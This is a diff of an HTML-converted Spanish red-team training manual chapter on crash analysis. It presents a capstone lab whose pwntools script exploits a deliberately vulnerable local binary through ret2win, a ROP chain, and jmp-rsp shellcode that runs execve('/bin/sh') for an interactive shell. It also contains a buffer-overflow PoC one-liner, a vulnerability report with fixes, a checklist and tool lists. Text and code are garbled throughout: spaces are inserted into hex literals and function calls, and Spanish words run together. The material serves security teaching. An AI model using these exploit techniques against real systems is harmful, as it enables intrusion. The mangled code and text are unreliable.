+<p>parts = line. split ('@')</p>
+<p>name = parts[0]. strip ()</p>
+<p>addr_str = parts[1]. strip (). split ()[0]</p>
+<p>gadgets[name] = int (addr_str, 16)</p>
 <p>return gadgets</p>
 <p>except:</p>
 <h1>Fallback - ajustar según tu compilación</h1>
 <p>return {</p>
-<p>'pop rdi; ret': 0x401952,</p>
-<p>'win()': 0x401256,</p>
-<p>'win_with_arg(magic)': 0x4012b8,</p>
-<p>'jmp rsp': 0x40196f,</p>
-<p>def exploit_ret2win(self):</p>
-<p>"""Simple ret2win - redirigir ejecución a win()"""</p>
-<p>log. info("=== Exploit: ret2win ===")</p>
+<p>'pop rdi; ret': 0 x 401952,</p>
+<p>'win ()': 0 x 401256,</p>
+<p>'win_with_arg (magic)': 0 x 4012 b 8,</p>
+<p>'jmp rsp': 0 x 40196 f,</p>
+<p>def exploit_ret 2 win (self):</p>
+<p>"""Simple ret 2 win - redirigir ejecución a win ()"""</p>
+<p>log. info ("=== Exploit: ret 2 win ===")</p>
 <p>offset = 72</p>
-<p>win_addr = self. gadgets. get('win()', 0x401256)</p>
+<p>win_addr = self. gadgets. get ('win ()', 0 x 401256)</p>
 <p>payload = b"A" * offset</p>
-<p>payload += p64(win_addr)</p>
-<p>log. info(f"Payload: {offset} bytes padding + win() @ {hex(win_addr)}")</p>
+<p>payload += p 64(win_addr)</p>
+<p>log. info (f"Payload: {offset} bytes padding + win () @ {hex (win_addr)}")</p>
 <h1>Escribir payload a archivo (para evitar problemas con argv)</h1>
-<p>with open(PAYLOAD_FILE, 'wb') as f:</p>
-<p>f. write(payload)</p>
+<p>with open (PAYLOAD_FILE, 'wb') as f:</p>
+<p>f. write (payload)</p>
 <h1>Ejecutar via bash command substitution</h1>
 <p>cmd = f'./vuln_rop 1 "$(cat {PAYLOAD_FILE})"'</p>
-<p>p = process(['bash', '-c', cmd], cwd=LAB_DIR)</p>
-<p>output = p. recvall(timeout=2).decode(errors='replace')</p>
-<p>print(output)</p>
+<p>p = process (['bash', '-c', cmd], cwd=LAB_DIR)</p>
+<p>output = p. recvall (timeout=2). decode (errors='replace')</p>
+<p>print (output)</p>
 <p>if "EXPLOTACIÓN EXITOSA" in output:</p>
-<p>log. success("ret2win exitoso!")</p>
+<p>log. success ("ret 2 win exitoso!")</p>
 <p>return True</p>
 <p>return False</p>
-<p>def exploit_rop_chain(self):</p>
-<p>"""ROP chain: pop rdi; ret -> win_with_arg(0xdeadbeefcafebabe)"""</p>
-<p>log. info("=== Exploit: ROP chain con argumento ===")</p>
+<p>def exploit_rop_chain (self):</p>
+<p>"""ROP chain: pop rdi; ret -> win_with_arg (0 xdeadbeefcafebabe)"""</p>
+<p>log. info ("=== Exploit: ROP chain con argumento ===")</p>
 <p>offset = 72</p>
-<p>pop_rdi = self. gadgets. get('pop rdi; ret', 0x401952)</p>
-<p>win_arg = self. gadgets. get('win_with_arg(magic)', 0x4012b8)</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>magic = 0xdeadbeefcafebabe</p>
+<p>pop_rdi = self. gadgets. get ('pop rdi; ret', 0 x 401952)</p>
+<p>win_arg = self. gadgets. get ('win_with_arg (magic)', 0 x 4012 b 8)</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>magic = 0 xdeadbeefcafebabe</p>
 <h1>Construir ROP chain</h1>
 <p>payload = b"A" * offset</p>
-<p>payload += p64(pop_rdi) # pop rdi; ret</p>
-<p>payload += p64(magic) # argumento para win_with_arg</p>
-<p>payload += p64(win_arg) # llamar win_with_arg</p>
-<p>log. info(f"ROP chain:")</p>
-<p>log. info(f" pop_rdi @ {hex(pop_rdi)}")</p>
-<p>log. info(f" magic = {hex(magic)}")</p>
-<p>log. info(f" win_with_arg @ {hex(win_arg)}")</p>
+<p>payload += p 64(pop_rdi) # pop rdi; ret</p>
+<p>payload += p 64(magic) # argumento para win_with_arg</p>
+<p>payload += p 64(win_arg) # llamar win_with_arg</p>
+<p>log. info (f"ROP chain:")</p>
+<p>log. info (f" pop_rdi @ {hex (pop_rdi)}")</p>
+<p>log. info (f" magic = {hex (magic)}")</p>
+<p>log. info (f" win_with_arg @ {hex (win_arg)}")</p>
 <h1>NOTA: Esta técnica falla via argv porque bash strips null bytes</h1>
 <h1>En un exploit real, usarías stdin o socket</h1>
-<p>log. warning("ROP chain via argv tiene limitaciones de null bytes")</p>
-<p>log. info("Ver código para técnica alternativa con GDB")</p>
+<p>log. warning ("ROP chain via argv tiene limitaciones de null bytes")</p>
+<p>log. info ("Ver código para técnica alternativa con GDB")</p>
 <p>return False</p>
-<p>def exploit_shellcode(self):</p>
+<p>def exploit_shellcode (self):</p>
 <p>"""jmp rsp + shellcode (requiere -z execstack)"""</p>
-<p>log. info("=== Exploit: jmp rsp + shellcode ===")</p>
+<p>log. info ("=== Exploit: jmp rsp + shellcode ===")</p>
 <p>offset = 72</p>
-<p>jmp_rsp = self. gadgets. get('jmp rsp', 0x40196f)</p>
-<h1>Shellcode x86-64 execve("/bin/sh")</h1>
-<p>shellcode = asm('''</p>
+<p>jmp_rsp = self. gadgets. get ('jmp rsp', 0 x 40196 f)</p>
+<h1>Shellcode x 86-64 execve ("/bin/sh")</h1>
+<p>shellcode = asm ('''</p>
 <p>xor rsi, rsi</p>
 <p>push rsi</p>
-<p>mov rdi, 0x68732f2f6e69622f</p>
+<p>mov rdi, 0 x 68732 f 2 f 6 e 69622 f</p>
 <p>push rdi</p>
 <p>push rsp</p>
 <p>pop rdi</p>
@@ -2080,34 +2080,34 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <p>syscall</p>
 <p>''')</p>
 <p>payload = b"A" * offset</p>
-<p>payload += p64(jmp_rsp)</p>
+<p>payload += p 64(jmp_rsp)</p>
 <p>payload += shellcode</p>
-<p>log. info(f"jmp rsp @ {hex(jmp_rsp)} -> {len(shellcode)} byte shellcode")</p>
-<p>log. info("Este exploit spawneará un shell interactivo")</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>with open(PAYLOAD_FILE, 'wb') as f:</p>
-<p>f. write(payload)</p>
+<p>log. info (f"jmp rsp @ {hex (jmp_rsp)} -> {len (shellcode)} byte shellcode")</p>
+<p>log. info ("Este exploit spawneará un shell interactivo")</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>with open (PAYLOAD_FILE, 'wb') as f:</p>
+<p>f. write (payload)</p>
 <p>cmd = f'./vuln_rop 1 "$(cat {PAYLOAD_FILE})"'</p>
-<p>p = process(['bash', '-c', cmd], cwd=LAB_DIR)</p>
-<p>p. interactive()</p>
+<p>p = process (['bash', '-c', cmd], cwd=LAB_DIR)</p>
+<p>p. interactive ()</p>
 <p>if __name__ == "__main__":</p>
 <p>import sys</p>
-<p>exploit = RopExploit()</p>
-<p>if len(sys. argv) > 1:</p>
+<p>exploit = Rop Exploit ()</p>
+<p>if len (sys. argv) > 1:</p>
 <p>cmd = sys. argv[1]</p>
 <p>if cmd == "win":</p>
-<p>exploit. exploit_ret2win()</p>
+<p>exploit. exploit_ret 2 win ()</p>
 <p>elif cmd == "rop":</p>
-<p>exploit. exploit_rop_chain()</p>
+<p>exploit. exploit_rop_chain ()</p>
 <p>elif cmd == "shell":</p>
-<p>exploit. exploit_shellcode()</p>
+<p>exploit. exploit_shellcode ()</p>
 <p>else:</p>
-<h1>Demo ret2win por defecto</h1>
-<p>exploit. exploit_ret2win()</p>
+<h1>Demo ret 2 win por defecto</h1>
+<p>exploit. exploit_ret 2 win ()</p>
 <ol>
   <li>6.4. 4. 7.4 Generación del Reporte Final</li>
 </ol>
-<p>Paragenerarelreportefinal,creamosunarchivoMarkdownestructurado:</p>
+<p>Paragenerarelreportefinal, creamosunarchivo Markdownestructurado:</p>
 <p>cd ~/crash_analysis_lab/capstone</p>
 <p>cat > reports/vulnerability_report. md << 'EOF'</p>
 <p>[contenido del reporte - ver formato abajo]</p>
@@ -2117,79 +2117,79 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <ol>
   <li>6.4. 1. Reportede Análisis de Crashes: vulnerable_suite. c</li>
 </ol>
-<p>ResumenEjecutivo</p>
+<p>Resumen Ejecutivo</p>
 <p>El análisis de crashes de vulnerable_suite. c identificó 4 vulnerabilidades explotables únicas y</p>
 <p>1 crash no explotable. Todaslas vulnerabilidades explotables son locales pero demuestran clases</p>
 <p>comunesdevulnerabilidades.</p>
 <p>Metodología</p>
 <ol>
-  <li>Generación de Crashes:28inputsdecrashen5testcases</li>
-  <li>Triage:ClasificaciónautomatizadaconCASR</li>
-  <li>Deduplicación:Reduccióna5clustersúnicos</li>
-  <li>Análisis:CausaraízconASANyGDB</li>
+  <li>Generación de Crashes:28 inputsdecrashen 5 testcases</li>
+  <li>Triage: Clasificaciónautomatizadacon CASR</li>
+  <li>Deduplicación: Reduccióna 5 clustersúnicos</li>
+  <li>Análisis: Causaraízcon ASA Ny GDB</li>
 </ol>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <ol>
-  <li>Minimización:Reducciónatriggersmínimos</li>
-  <li>PoC Development:ScriptsPythonconfiables</li>
+  <li>Minimización: Reducciónatriggersmínimos</li>
+  <li>Po C Development: Scripts Pythonconfiables</li>
 </ol>
 <p>Hallazgos</p>
 <p>Hallazgo 1: Stack Buffer Overflow (CRÍTICO)</p>
 <p>Atributo Valor</p>
-<p>TestCase 1</p>
+<p>Test Case 1</p>
 <p>Severidad CRÍTICO</p>
-<p>ClasificaciónCASR EXPLOITABLE</p>
-<p>CausaRaíz strcpy()sinlímitesabufferde64bytes</p>
-<p>Impacto ControldeRIP,potencialRCE</p>
-<p>TriggerMínimo 73bytes</p>
-<p>OffsetaRIP 72bytes</p>
-<p>PoCdedemostración:</p>
-<p>./vuln_no_protect 1 $(python3 -c "print('A'*72 + 'BBBBBBBB')")</p>
-<h1>RIP = 0x4242424242424242</h1>
+<p>Clasificación CASR EXPLOITABLE</p>
+<p>Causa Raíz strcpy()sinlímitesabufferde 64 bytes</p>
+<p>Impacto Controlde RIP, potencial RCE</p>
+<p>Trigger Mínimo 73 bytes</p>
+<p>Offseta RIP 72 bytes</p>
+<p>Po Cdedemostración:</p>
+<p>./vuln_no_protect 1 $(python 3 -c "print ('A'*72 + 'BBBBBBBB')")</p>
+<h1>RIP = 0 x 4242424242424242</h1>
 <p>Hallazgo 2: Heap Buffer Overflow (ALTO)</p>
 <p>Atributo Valor</p>
-<p>TestCase 2</p>
+<p>Test Case 2</p>
 <p>Severidad ALTO</p>
-<p>ClasificaciónCASR EXPLOITABLE</p>
-<p>CausaRaíz strcpy()sinlímitesabufferdeheapde32bytes</p>
+<p>Clasificación CASR EXPLOITABLE</p>
+<p>Causa Raíz strcpy()sinlímitesabufferdeheapde 32 bytes</p>
 <p>Impacto Corrupcióndemetadatosdelheap</p>
-<p>Nota SilenciososinASAN</p>
+<p>Nota Silenciososin ASAN</p>
 <p>Hallazgo 3: Use-After-Free (ALTO)</p>
 <p>Atributo Valor</p>
-<p>TestCase 3</p>
+<p>Test Case 3</p>
 <p>Severidad ALTO</p>
-<p>ClasificaciónCASR EXPLOITABLE</p>
-<p>CausaRaíz Punterousadodespuésdefree()</p>
+<p>Clasificación CASR EXPLOITABLE</p>
+<p>Causa Raíz Punterousadodespuésdefree()</p>
 <p>Impacto Lectura/escrituraarbitraria</p>
-<p>Nota SilenciososinASAN</p>
+<p>Nota Silenciososin ASAN</p>
 <p>Hallazgo 4: Double Free (ALTO)</p>
 <p>Atributo Valor</p>
-<p>TestCase 4</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>Test Case 4</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>Atributo Valor</p>
 <p>Severidad ALTO</p>
-<p>ClasificaciónCASR EXPLOITABLE</p>
-<p>CausaRaíz Mismopunteroliberadodosveces</p>
+<p>Clasificación CASR EXPLOITABLE</p>
+<p>Causa Raíz Mismopunteroliberadodosveces</p>
 <p>Impacto Corrupcióndelheap</p>
 <p>Hallazgo 5: NULL Pointer Dereference(BAJO)</p>
 <p>Atributo Valor</p>
-<p>TestCase 5</p>
+<p>Test Case 5</p>
 <p>Severidad BAJO</p>
-<p>ClasificaciónCASR NOT_EXPLOITABLE</p>
-<p>CausaRaíz DesreferenciadepunteroNULL</p>
-<p>Impacto DoSsolamente</p>
+<p>Clasificación CASR NOT_EXPLOITABLE</p>
+<p>Causa Raíz Desreferenciadepuntero NULL</p>
+<p>Impacto Do Ssolamente</p>
 <p>Recomendaciones</p>
 <ol>
-  <li>StackOverflow:Reemplazarstrcpy()constrncpy()osnprintf()</li>
-  <li>Heap Overflow:Agregarverificacióndelímitesantesdecopias</li>
-  <li>UAF:SetearpunterosaNULLdespuésdefree,usarsmartpointers</li>
-  <li>Double-Free:Rastrearestadodeallocación</li>
-  <li>NULL Deref:AgregarverificacionesNULLantesdedesreferencias</li>
+  <li>Stack Overflow: Reemplazarstrcpy () constrncpy () osnprintf ()</li>
+  <li>Heap Overflow: Agregarverificacióndelímitesantesdecopias</li>
+  <li>UAF: Setearpunterosa NUL Ldespuésdefree, usarsmartpointers</li>
+  <li>Double-Free: Rastrearestadodeallocación</li>
+  <li>NULL Deref: Agregarverificaciones NUL Lantesdedesreferencias</li>
 </ol>
 <p>Entregables</p>
-<p>pocs/-ScriptsPoCparacadavulnerabilidad</p>
+<p>pocs/-Scripts Po Cparacadavulnerabilidad</p>
 <p>minimized/-Inputsdecrashminimizados</p>
-<p>casrep/-ReportesdeanálisisCASR</p>
+<p>casrep/-Reportesdeanálisis CASR</p>
 <ol>
   <li>6.5. 4. 7.5 Checklist del Capstone</li>
 </ol>
@@ -2197,13 +2197,13 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <h2>│ CHECKLIST DEL PROYECTO CAPSTONE │</h2>
 <p>├──────────────────────────────────────────────────────────────────────────┤</p>
 <h2>│ SETUP │</h2>
-<p>│ [ ] Entorno de laboratorio configurado (~/.crash_analysis_lab/) │</p>
+<p>│ [ ] Entorno de laboratorio configurado (~/. crash_analysis_lab/) │</p>
 <p>│ [ ] Binarios compilados (vuln_no_protect, vuln_asan, vuln_rop) │</p>
 <p>│ [ ] Herramientas instaladas (pwntools, CASR, ropper) │</p>
 <h2>│ FASE 1: GENERACIÓN DE CRASHES │</h2>
 <p>│ [ ] 28+ inputs de crash generados │</p>
 <p>│ [ ] Crashes categorizados por test case │</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <h2>│ FASE 2: TRIAGE │</h2>
 <p>│ [ ] Reportes CASR generados para todos los crashes │</p>
 <p>│ [ ] Crashes agrupados en 5 clusters únicos │</p>
@@ -2214,88 +2214,88 @@ pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Pytho
 <h2>│ FASE 4: MINIMIZACIÓN │</h2>
 <p>│ [ ] Tamaños de trigger mínimo encontrados │</p>
 <p>│ [ ] Archivos minimizados guardados │</p>
-<p>│ FASE 5: DESARROLLO DE PoC │</p>
-<p>│ [ ] Suite de PoC Python creada │</p>
-<p>│ [ ] Cada PoC probado para confiabilidad (>90%) │</p>
-<p>│ [ ] PoC de explotación (ret2win) funcional │</p>
+<p>│ FASE 5: DESARROLLO DE Po C │</p>
+<p>│ [ ] Suite de Po C Python creada │</p>
+<p>│ [ ] Cada Po C probado para confiabilidad (>90%) │</p>
+<p>│ [ ] Po C de explotación (ret 2 win) funcional │</p>
 <h2>│ FASE 6: REPORTE │</h2>
 <p>│ [ ] Reporte de vulnerabilidades generado │</p>
 <p>│ [ ] Severidades correctamente asignadas │</p>
 <p>│ [ ] Recomendaciones de remediación incluidas │</p>
 <p>└──────────────────────────────────────────────────────────────────────────┘</p>
 <ol>
-  <li>7. 4. 8 Conclusiones del Capítulo 4</li>
+  <li>7. 4. 8 Conclusiones del <a href="04-patch-diffing.html">Capítulo 4</a></li>
   <li>7.1. Principios Fundamentales</li>
   <li>La reproducibilidad es obligatoria: Antes de cualquier análisis, asegurar que el crash sea</li>
 </ol>
-<p>reproducibledemaneraconfiable. Usarrr/TTDparacrashesnodeterminísticos.</p>
+<p>reproducibledemaneraconfiable. Usarrr/TT Dparacrashesnodeterminísticos.</p>
 <ol>
   <li>Los sanitizers son esenciales: ASAN, UBSAN y otros sanitizers convierten bugs silenciosos</li>
 </ol>
 <p>encrashesinformativos. Siempreusarbuildsconsanitizersparatriage.</p>
 <ol>
-  <li>Laautomatizaciónescala:HerramientascomoCASRautomatizaneltriagedegrandescorpus</li>
+  <li>Laautomatizaciónescala: Herramientascomo CAS Rautomatizaneltriagedegrandescorpus</li>
 </ol>
 <p>decrashes. Elpipelinemanualnoescalamásalládeunospocosbugs.</p>
 <ol>
   <li>La minimización clarifica: Reducir el input al mínimo necesario facilita el análisis de causa</li>
 </ol>
-<p>raízyhacelosPoCsmásentendibles.</p>
+<p>raízyhacelos Po Csmásentendibles.</p>
 <ol>
-  <li>Laexplotabilidaddependedelcontexto:Elmismotipodebugpuedesercríticooinforma-</li>
+  <li>Laexplotabilidaddependedelcontexto: Elmismotipodebugpuedesercríticooinforma-</li>
 </ol>
-<p>cionaldependiendodelcontroldelatacante,lasmitigacionespresentes,ylaalcanzabilidad.</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>cionaldependiendodelcontroldelatacante, lasmitigacionespresentes, ylaalcanzabilidad.</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <ol>
-  <li>Ladocumentaciónimporta:Mantenerregistrosclarosdecrashes,análisis,PoCsyconclusio-</li>
+  <li>Ladocumentaciónimporta: Mantenerregistrosclarosdecrashes, análisis, Po Csyconclusio-</li>
 </ol>
 <p>nes. Losbuenosreportesfacilitanlacomunicacióncondesarrolladores.</p>
 <ol>
   <li>7.2. Tabla de Herramientas Clave</li>
 </ol>
 <p>Herramienta Propósito Plataforma</p>
-<p>WinDbg+TTD Depuracióncontimetravel Windows</p>
+<p>Win Dbg+TTD Depuracióncontimetravel Windows</p>
 <p>GDB+Pwndbg Depuraciónorientadaaexploits Linux</p>
 <p>ASAN/UBSAN Deteccióndebugsdememoria Todas</p>
 <p>CASR Clasificaciónyclustering Linux</p>
 <p>rr Recordandreplay Linux</p>
 <p>Frida Instrumentacióndinámica Todas</p>
-<p>pwntools DesarrollodePoC/exploits Python</p>
+<p>pwntools Desarrollode Po C/exploits Python</p>
 <p>afl-tmin Minimizacióndecrashes Linux</p>
 <ol>
   <li>7.3. Preguntas de Discusión</li>
-  <li>¿Porquéelstackoverflowrequiere72bytesparacontrolarRIP(no64)?</li>
-  <li>¿CómoafectaríaASLRlaexplotacióndelstackoverflowenvuln_protected?</li>
-  <li>¿PorquéelNULLpointerdereferenceseclasificacomoNOT_EXPLOITABLEmientraslosotros</li>
+  <li>¿Porquéelstackoverflowrequiere 72 bytesparacontrolar RIP(no 64)?</li>
+  <li>¿Cómoafectaría ASL Rlaexplotacióndelstackoverflowenvuln_protected?</li>
+  <li>¿Porquéel NUL Lpointerdereferenceseclasificacomo NOT_EXPLOITABL Emientraslosotros</li>
 </ol>
-<p>sonEXPLOITABLE?</p>
+<p>son EXPLOITABLE?</p>
 <ol>
   <li>¿Quécambiosseríannecesariosparaextenderelanálisisaltargetderedvuln_http_server?</li>
-  <li>¿CuálessonlasconsideracioneséticasalpublicarcódigodePoC?</li>
+  <li>¿Cuálessonlasconsideracioneséticasalpublicarcódigode Po C?</li>
   <li>8. Documentación y Estándares</li>
 </ol>
-<p>CVSSv4. 0Specification</p>
-<p>CWE-CommonWeaknessEnumeration</p>
-<p>MITREATT&CKFramework</p>
-<p>NVD-NationalVulnerabilityDatabase</p>
+<p>CVS Sv 4. 0Specification</p>
+<p>CWE-Common Weakness Enumeration</p>
+<p>MITREATT&CK Framework</p>
+<p>NVD-National Vulnerability Database</p>
 <ol>
   <li>9. Herramientas Principales</li>
 </ol>
 <p>Herramienta Propósito URL</p>
-<p>AFL++ Fuzzingguiadoporcobertura github. com/AFLplusplus/AFLplusplus</p>
+<p>AFL++ Fuzzingguiadoporcobertura github. com/AF Lplusplus/AF Lplusplus</p>
 <p>Honggfuzz Fuzzingmulti-hilo github. com/google/honggfuzz</p>
 <p>Syzkaller Fuzzingdekernel github. com/google/syzkaller</p>
 <p>Ghidra Ingenieríareversa ghidra-sre. org</p>
 <p>Ghidriff Diffingbinario github. com/clearbluejar/ghidriff</p>
-<p>Pwndbg ExtensiónGDB github. com/pwndbg/pwndbg</p>
+<p>Pwndbg Extensión GDB github. com/pwndbg/pwndbg</p>
 <p>CASR Clasificacióndecrashes github. com/ispras/casr</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <ol>
   <li>10. Fuentes de Información de Vulnerabilidades</li>
 </ol>
-<p>GoogleProjectZeroBlog</p>
-<p>MicrosoftSecurityResponseCenter</p>
-<p>CISAKnownExploitedVulnerabilities</p>
+<p>Google Project Zero Blog</p>
+<p>Microsoft Security Response Center</p>
+<p>CISA Known Exploited Vulnerabilities</p>
 <p>Exploit-DB</p>
 <p>Fin del Documento</p>
 <p>Estematerialesdecaráctereducativoyestádestinadoainvestigadoresdeseguridadparapropósitos</p>
